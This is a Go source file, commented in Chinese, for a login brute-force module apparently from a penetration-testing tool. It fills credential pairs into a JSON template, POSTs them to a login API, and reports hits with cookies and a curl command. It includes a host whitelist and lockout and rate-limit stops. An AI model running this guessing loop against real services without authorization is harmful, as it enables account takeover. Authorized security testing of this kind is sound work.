// JSON API 登录爆破：针对无 <form> 的 JSON 登录接口。
// 用户在界面上提供 JSON 模板（含 {user}/{pass} 占位符）与可选成功特征，
// 工具逐组合替换占位符后 POST——命中判定：HTTP 200 且（可选）包含
// 成功特征串，且响应偏离失败基线。
package loginbrute

import (
	"fmt"
	"strings"
)

// JSONBrute JSON API 登录爆破：返回命中列表（命中一组即停）。
// JSONTemplate 为含 {user}/{pass} 占位符的 JSON 模板；JSONEndpoint
// 为空时 POST 到登录页地址。maxTries/intervalMS 同表单模式语义。
//
// LB-01 护栏与表单模式一致：锁号/限流信号（429/403 或响应含锁定/限流
// 特征）立即停止；连续失败达阈值停止或指数退避；每账号尝试数受限；
// 命中附响应差异摘要 + Set-Cookie + 跳转 + curl。JSON 接口无表单 CSRF
// 字段，故不做登录页 token 重取（N/A）。
func JSONBrute(p Poster, o Options, onProgress func(done, total int, msg string)) ([]Hit, error) {
	if onProgress == nil {
		onProgress = func(int, int, string) {}
	}
	// LB-02：授权白名单（零请求前置检查）
	if err := checkAllowHosts(&o); err != nil {
		return nil, err
	}
	if o.JSONTemplate == "" {
		return nil, fmt.Errorf("JSON 模式需要提供 JSON 模板（含 {user}/{pass} 占位符）")
	}
	if o.MaxTries <= 0 {
		o.MaxTries = 300
	}
	maxPerUser, maxFails := resolveGuard(&o)
	endpoint := o.JSONEndpoint
	if endpoint == "" {
		endpoint = o.PageURL
	}
	// LB-02：端点 host 同样受白名单约束
	if err := requireStepAllowed(&o, endpoint); err != nil {
		return nil, err
	}

	combos := buildCombos(o.Users, o.Passwords, o.MaxTries, maxPerUser)
	total := len(combos)

	// 失败基线：一组必然错误的提交（仅取响应体尺寸/状态）。
	bStatus, bBody, _, berr := postJSONFull(p, endpoint, applyJSON(o.JSONTemplate, "__nl__", "__nl__"))
	baseSize := len(bBody)
	if berr != nil {
		baseSize = 0
	} else if sig := lockoutSignal(bStatus, bBody); sig != "" {
		return nil, fmt.Errorf("失败基线即触发锁号/限流信号（%s）：已停止对 %s 的 JSON 登录爆破，避免误锁真实账号", sig, endpoint)
	}

	var hits []Hit
	fails, backoffLevel := 0, 0
	for i, c := range combos {
		if o.Cancel != nil && o.Cancel() {
			break // 已取消：停止后续登录尝试，命中结果照常返回
		}
		sleepInterval(o.IntervalMS, i)
		body := applyJSON(o.JSONTemplate, c.u, c.pw)
		status, rbody, header, rerr := postJSONFull(p, endpoint, body)
		progress := attemptProgress(c.u, c.pw)
		if rerr != nil {
			// 网络错误：归类 unknown（可观测），不改变既有 continue 语义
			_ = notifyFailure(&o, c.u, 0, "")
			onProgress(i+2, total, progress+" [失败: "+FailureUnknown+"]")
			continue
		}
		// LB-01 锁号保护：失败响应出现锁号/限流特征或 429/403 → 立即停止
		if sig := lockoutSignal(status, rbody); sig != "" {
			cat := notifyFailure(&o, c.u, status, rbody)
			onProgress(i+2, total, progress+" [失败: "+cat+"]")
			return hits, fmt.Errorf("检测到锁号/限流信号（%s）：已立即停止对 %s 的 JSON 登录爆破"+
				"（已尝试 %d/%d 组）。请稍后人工复核，避免锁死真实账号", sig, endpoint, i+1, len(combos))
		}
		if status == 200 &&
			(o.SuccessContains == "" || strings.Contains(rbody, o.SuccessContains)) &&
			(baseSize == 0 || rbody != bBody) {
			onProgress(i+2, total, progress) // 命中：不标失败
			ev := jsonEvidence(endpoint, body, status, rbody, header, bStatus, baseSize)
			hits = append(hits, Hit{
				Type: "json-api", User: c.u, Password: c.pw, URL: endpoint,
				Note:     "JSON API 登录命中为启发式判定，请人工复核",
				Evidence: ev.Summary, Redirect: ev.Redirect,
				SetCookie: ev.SetCookie, Curl: ev.Curl,
			})
			break
		}
		// LB-02：失败原因分类（只做可观测，不影响命中/停止判定）
		cat := notifyFailure(&o, c.u, status, rbody)
		onProgress(i+2, total, progress+" [失败: "+cat+"]")
		fails++
		if maxFails > 0 && fails >= maxFails {
			if o.FailBackoffMS > 0 {
				d := backoffDelay(o.FailBackoffMS, backoffLevel)
				backoffLevel++
				onProgress(i+2, total, fmt.Sprintf("连续失败 %d 次，指数退避 %s 后继续", fails, d))
				sleepMS(int(d.Milliseconds()))
				fails = 0
				continue
			}
			return hits, fmt.Errorf("连续失败 %d 次达到阈值：已停止对 %s 的 JSON 登录爆破，避免锁死真实账号"+
				"（可用 Options.MaxConsecutiveFails 调整，负值关闭；或配 Options.FailBackoffMS 改为退避）",
				fails, endpoint)
		}
	}
	return hits, nil
}

// applyJSON 模板占位符替换。
func applyJSON(tpl, user, pass string) string {
	return strings.NewReplacer("{user}", user, "{pass}", pass).Replace(tpl)
}
